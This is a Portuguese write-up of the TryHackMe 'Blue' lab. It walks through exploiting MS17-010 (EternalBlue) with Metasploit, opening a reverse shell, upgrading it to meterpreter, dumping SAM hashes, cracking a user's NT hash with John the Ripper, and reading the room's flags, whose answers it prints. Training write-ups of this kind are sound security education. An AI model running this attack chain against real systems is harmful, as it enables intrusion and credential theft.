TryHackMe: Blue (inspirado em EternalBlue)
Nivel: Facíl
Tempo: ~1h
Ferramentas: Nmap, Hashdump, Metasploit
Tipo: Windows

O cenário Blue do TryHackMe é uma máquina Windows 7 Professional vulnerável ao exploit EternalBlue (MS17‑010), usada para treinar reconhecimento de serviços, exploração via Metasploit, pós‑exploração e quebra de hashes NT. O primeiro passo é a enumeração. A partir da VPN do TryHackMe e com o IP da máquina alvo, executa‑se um scan completo com Nmap, por exemplo nmap -sS -Pn -A -p- -T5 IP_ALVO. O resultado mostra várias portas TCP abertas, entre elas 135, 139 e, principalmente, 445 (SMB), além da identificação do sistema operacional como Windows 7 SP1 x64, o que já levanta suspeita de EternalBlue. Para confirmar a vulnerabilidade, é utilizado um script NSE específico: nmap -sS -Pn -p 445 IP_ALVO --script smb-vuln-ms17-010. A saída indica explicitamente que o host é “LIKELY VULNERABLE TO MS17-010”, respondendo às primeiras questões da room (3 portas abaixo de 1000 abertas e vulnerabilidade ms17‑010).

Com a vulnerabilidade confirmada, passa‑se para a exploração com Metasploit. Inicia‑se o framework com msfconsole e, no prompt msf>, procura‑se pelos módulos relacionados a MS17‑010 com search ms17-010. Entre os resultados, o módulo principal para esse cenário é exploit/windows/smb/ms17_010_eternalblue, que é então carregado com use exploit/windows/smb/ms17_010_eternalblue. Em seguida, o comando show options (ou options) exibe os parâmetros necessários; o mais importante para o exercício é RHOSTS, que deve ser configurado com o IP da máquina Blue usando set RHOSTS IP_ALVO. Para fins didáticos, a room orienta a forçar o payload para um shell reverso simples de 64 bits, usando set payload windows/x64/shell/reverse_tcp, em vez do padrão meterpreter.

Com as opções ajustadas (incluindo LHOST se necessário), o exploit é disparado com run ou exploit. O Metasploit verifica novamente a vulnerabilidade MS17‑010, realiza as alocações de memória necessárias, envia os pacotes SMBv2 fragmentados e, se tudo der certo, exibe mensagens como “ETERNALBLUE overwrite completed successfully” seguidas da abertura de uma sessão de shell, algo como “Command shell session 1 opened”. Após alguns segundos, surge um prompt Windows do tipo C:\Windows\system32>, comprovando a execução de código remoto com privilégios altos. Essa shell inicial é então colocada em background com Ctrl+Z e confirmação em msf para permitir que seja convertida em uma sessão meterpreter.

A terceira fase é a escalada e estabilização da sessão. De volta ao console do Metasploit, pesquisa‑se o módulo de pós‑exploração responsável por converter shells em meterpreter com search shell_to_meterpreter. O módulo de interesse é post/multi/manage/shell_to_meterpreter, carregado com use post/multi/manage/shell_to_meterpreter. Novamente, show options revela os parâmetros obrigatórios; aqui, o campo crítico é SESSION, que deve apontar para o ID da sessão de shell previamente obtida (por exemplo, set SESSION 1). Ajusta‑se também LHOST para o IP da máquina de ataque, se necessário. Com tudo definido, executa‑se run, e o módulo injeta o payload meterpreter no processo remoto, criando uma nova sessão. Em seguida, lista‑se as sessões com sessions e entra‑se na sessão meterpreter correspondente com sessions -i ID.

Dentro da sessão meterpreter, valida‑se o nível de privilégio com getsystem, que tenta escalar para NT AUTHORITY\SYSTEM. Após o sucesso de getsystem, é possível abrir um shell tradicional com shell e rodar whoami para confirmar que o contexto é de SYSTEM. Contudo, mesmo sendo SYSTEM, o processo em que o meterpreter está injetado pode ser instável; por isso, utiliza‑se o comando ps para listar todos os processos e identifica‑se um que já rode como NT AUTHORITY\SYSTEM e seja relativamente estável, como winlogon.exe ou lsass.exe. Anota‑se o PID e manda‑se migrate PID. Esse passo migra o meterpreter para o processo alvo, reduzindo o risco de perder a sessão durante as próximas ações de pós‑exploração.

Com uma sessão meterpreter estável e com privilégios de SYSTEM, entra‑se na fase de cracking. O comando hashdump é executado a partir do meterpreter, extraindo os hashes LM e NT de todas as contas locais armazenadas no SAM. Entre as saídas, aparece um usuário não padrão chamado Jon, com um par LM/NT no formato RID:LM:NT:::. Interessa principalmente o hash NT de Jon, que é copiado para um arquivo em texto simples no Kali/Parrot, por exemplo hashBLUE.txt. O formato é compatível com --format=NT do John the Ripper. Em seguida, usa‑se john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashBLUE.txt. A primeira vez que esse comando é executado, John carrega a hash NT, aplica o wordlist rockyou.txt e, após algum tempo, obtém a senha em claro para a conta Jon. Segundo o writeup de referência, a senha quebrada desse hash é alqfna22. Em execuções subsequentes, John pode retornar “No password hashes left to crack (see FAQ)”, indicando que o hash já foi resolvido anteriormente e armazenado no john.pot; basta então rodar john --show hashBLUE.txt para ver a senha.

Com a senha de Jon em mãos, seria possível, em um cenário real, usá‑la para autenticação via RDP, SMB ou outros serviços. Na room Blue, porém, o foco agora é encontrar as flags espalhadas pelo sistema de arquivos, simulando a coleta de dados sensíveis após o comprometimento. A Task 5 define três flags. A primeira, “Flag1? This flag can be found at the system root.”, é localizada na raiz do sistema, tipicamente C:\ ou C:\Windows\system32\, e seu conteúdo é flag{access_the_machine}. A segunda, “Flag2? This flag can be found at the location where passwords are stored within Windows.”, está associada ao local dos hashes do Windows (SAM). Uma forma prática de localizá‑la é utilizar o próprio meterpreter com search -f flag2.txt ou navegar diretamente para C:\Windows\System32\config\ ou C:\Windows\System32\config\RegBack\. O conteúdo dessa flag é flag{sam_database_elevated_access}, referindo‑se ao acesso elevado ao banco SAM. A terceira flag é descrita como “This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.”; na prática, encontra‑se em pastas de usuários privilegiados, como C:\Users\Administrator\Documents\ ou outros diretórios de perfil. O writeup original localiza essa flag como um arquivo de texto nos documentos, e seu conteúdo é flag{admin_documents_can_be_valuable}, destacando o valor das pastas de documentos de administradores em pós‑exploração.

Durante essa fase, comandos do meterpreter como cd, ls e cat são usados para navegar nas pastas de usuários (C:\Users\jon\Documents, C:\Users\Administrator\Desktop, etc.) e ler os arquivos de flag. As capturas de tela anexadas mostram, por exemplo, o diretório C:\Users\jon\Documents sendo listado via meterpreter e a leitura do arquivo flag3.txt com cat, o que está alinhado com a ideia de que administradores e usuários privilegiados costumam armazenar informações sensíveis em Documentos e Desktop. Em um fluxo de pentest real, essa mesma abordagem seria aplicada a arquivos de configuração, planilhas, chaves privadas, scripts e outros artefatos.

Resumindo em termos técnicos, a máquina Blue ilustra um ciclo completo de ataque em ambiente controlado: descoberta de superfície por Nmap com scripts NSE, identificação de vulnerabilidade MS17‑010 em SMB, exploração com o módulo exploit/windows/smb/ms17_010_eternalblue no Metasploit, conversão de shell para meterpreter usando o módulo post/multi/manage/shell_to_meterpreter, estabilização da sessão por migração para um processo SYSTEM estável, coleta de hashes com hashdump, quebra de hash NT com John the Ripper (formato NT e wordlist rockyou.txt) e, por fim, enumeração de sistema de arquivos para extração de flags nas localizações mais prováveis (raiz do sistema, diretórios ligados ao SAM e documentos de administradores). Todo esse processo reforça conceitos fundamentais de exploração em Windows e pós‑exploração, e deve ser utilizado exclusivamente em labs autorizados como o TryHackMe.
